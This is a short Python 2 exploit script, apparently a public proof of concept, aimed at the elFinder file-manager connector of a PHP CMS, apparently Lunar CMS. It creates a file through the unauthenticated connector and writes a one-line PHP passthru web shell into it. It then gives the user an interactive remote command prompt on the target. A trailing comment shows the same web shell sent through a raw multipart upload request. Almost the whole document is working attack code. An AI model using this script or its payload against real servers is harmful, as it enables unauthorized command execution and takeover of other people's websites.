import cookielib, urllib
import urllib2, sys, os

piton = os.path.basename(sys.argv[0])

if len(sys.argv) < 4:
	print '\n\x20\x20[*] Usage: '+piton+' <hostname> <path> <filename.php>\n'
	print '\x20\x20[*] Example: '+piton+' zeroscience.mk lunarcms backdoor.php\n'
	sys.exit()

host = sys.argv[1]
path = sys.argv[2]
fname = sys.argv[3]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

create = opener.open('http://'+host+'/'+path+'/admin/includes/elfinder/php/connector.php?cmd=mkfile&name='+fname+'&target=l1_XA')
#print create.read()

payload = urllib.urlencode({
							'cmd' : 'put',
							'target' : 'l1_'+fname.encode('base64','strict'),
							'content' : '<?php passthru($_GET[\'cmd\']); ?>'
							})

write = opener.open('http://'+host+'/'+path+'/admin/includes/elfinder/php/connector.php', payload)
#print write.read()
print '\n'
while True:
	try:
		cmd = raw_input('shell@'+host+':~# ')

		execute = opener.open('http://'+host+'/'+path+'/files/'+fname+'?cmd='+urllib.quote(cmd))
		reverse = execute.read()
		print reverse;
		
		if cmd.strip() == 'exit':
			break

	except Exception:
		break

sys.exit()


#
# Using the upload vector:
#
# POST /lc/admin/includes/elfinder/php/connector.php HTTP/1.1
# Host: localhost
# User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Referer: http://localhost/lc/admin/file_manager.php
# Content-Length: 443
# Content-Type: multipart/form-data; boundary=---------------------------156802976525302
# Cookie: PHPSESSID=n37tnhsdfs1sgolum477jgqg33
# Connection: keep-alive
# Pragma: no-cache
# Cache-Control: no-cache
#
# -----------------------------156802976525302
# Content-Disposition: form-data; name="cmd"
#
# upload
# -----------------------------156802976525302
# Content-Disposition: form-data; name="target"
#
# l1_XA
# -----------------------------156802976525302
# Content-Disposition: form-data; name="upload[]"; filename="shell.php"
# Content-Type: application/octet-stream
#
# <?php passthru($_GET['cmd']); ?>
# -----------------------------156802976525302--
#
#
